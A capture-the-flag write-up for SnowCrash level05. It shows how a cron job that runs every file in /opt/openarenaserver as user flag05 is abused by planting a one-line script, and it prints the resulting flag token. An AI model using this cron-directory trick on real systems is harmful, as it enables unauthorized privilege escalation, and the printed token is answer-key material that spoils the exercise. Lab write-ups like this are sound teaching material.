# level05
_Let's do the rit-_
```sh
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.0.2.15 fec0::a83f:f004:114a:bc8d fec0::5054:ff:fe12:3456
level05@127.0.0.1's password:
You have new mail.
level05@SnowCrash:~$
```

_"You have new mail." ?... Okayyyyy... Before dwelling on this, do the ritual_
- `pwd`: `/home/user/level05`
- `id`: `uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)`
- `ls -la`: nothing
- `find / -user flag05 2> /dev/null`:
```sh
level05@SnowCrash:~$ find / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$
```
_A suspect file..._
```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```

### What does this script execute ?

- `for i in /opt/openarenaserver/* ; do` : A loop that iterates over all files in `/opt/openarenaserver/`.
- `(ulimit -t 5; bash -x "$i")` : Sets a CPU time of 5 seconds for executing each files in debug mod (`-x`). Over 5 seconds, the script stops.
- `rm -f "$i"` : Delete the file that was executed.
- `done` : The end of the loop.

**The script execute all files in `/opt/openarenaserver/`, letting them 5 seconds to be completly executed before delete them.**

_Okay, with only with that I cannot do anything, I do not have any permission. Go focusing the `You have new mail.`_

- In Linux system, we can receive mails directly in our account files in the machine and store them. And when a mail is receive, the system tell the user `You have new mail.` or `You have mail.`.
- Where are these mails stored ? In the directory `/var/mail/$USER`. **Go check this directory** :
```sh
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$
```
- <u>A `crontab` file</u> : this programm the execution of **the script** as the user **flag05** <u>EVERY 2 MINUTES</U>.

## We need 2 things :
- A shared directory where user `flag05` can write and user `level05` can read : **`/var/tmp`**
- A script that `flag05` must execute for give us the flag and reach the next level (I guess ?...).

## To sum up
- We must ensure that the crontab file that we received by email executes the script `/usr/sbin/openarenaserver` (this is done by itself every 2 minutes).
- We will then place a script in the `/opt/openarenaserver/` directory so that the script meets the entry condition in the iteration loop.
- Then, at the line `(ulimit -t 5; bash -x "$i")` it will have to launch the `bash` script as `flag05` that we had previously placed.
- Finally, the output of our script will have to be displayed in the `/var/tmp` directory.
- We will wait 2 minutes before checking the output because the crontab executes every 2 minutes.

_A `getflag > /var/tmp` might do the trick_
```sh
level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag && sleep 120 && `cat /tmp/flag`
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$
```
- `getflag > /tmp/flag` : This command is the script
- `echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag` : We place the script on the right directory for it to be executed by the user `flag05`.
- `sleep 120` : Waiting minimum 2 minute for crontab execute his programmation.
- `cat /tmp/flag` : Obtain the **One Piece 👒**.

# _And here's the job !_

- Let's login to `level06` directly :
```sh
level05@SnowCrash:~$ su level06
Password:
level06@SnowCrash:~$
```
# level05 complet !
![yeah](../../assets/yeah.gif)